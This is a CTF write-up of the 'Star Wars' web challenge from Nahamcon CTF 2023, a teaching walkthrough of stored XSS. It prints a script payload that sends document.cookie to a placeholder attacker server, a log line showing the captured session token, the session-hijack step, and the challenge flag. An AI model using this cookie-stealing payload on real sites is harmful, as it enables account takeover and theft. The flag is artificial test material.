---
name: Star Wars (2023)
event: Nahamcon CTF 2023
category: Web
description: Writeup for Star Wars (Web) - Nahamcon CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Star Wars

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/XHg_sBD0-es/0.jpg)](https://www.youtube.com/watch?v=XHg_sBD0-es?t=18 "Nahamcon CTF 2023: Star Wars (Web)")

## Description

> If you love Star Wars as much as I do you need to check out this blog!

## Solution

Can't create an account or sign up as admin.

Register as `cat` and find a guestbook, provide XSS payload to steal cookie.

{% code overflow="wrap" %}
```html
<script>
    new Image().src =
        "http://ATTACKER_SERVER.ngrok-free.app?c=" + document.cookie;
</script>
```
{% endcode %}

Request is made to our server containing cookies, including a [JWT](https://youtu.be/GIq3naOLrTg)

{% code overflow="wrap" %}
```bash
127.0.0.1 - - [15/Jun/2023 23:09:24] "GET /?c=ss_cvr=3ad69c49-d9aa-4fb0-b6f1-5c38324adf3b|1686862282337|1686862282337|1686862282337|1;%20x-wing=eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE HTTP/1.1" 200 -
```
{% endcode %}

We replace the session cookie with `eyJfcGVybWFuZW50Ijp0cnVlLCJpZCI6MX0.ZIuMEw.0OSvB-AGOciNuH-n824cnC9uTFE` and receive a flag!

Flag: `flag{a538c88890d45a382e44dfd00296a99b}`
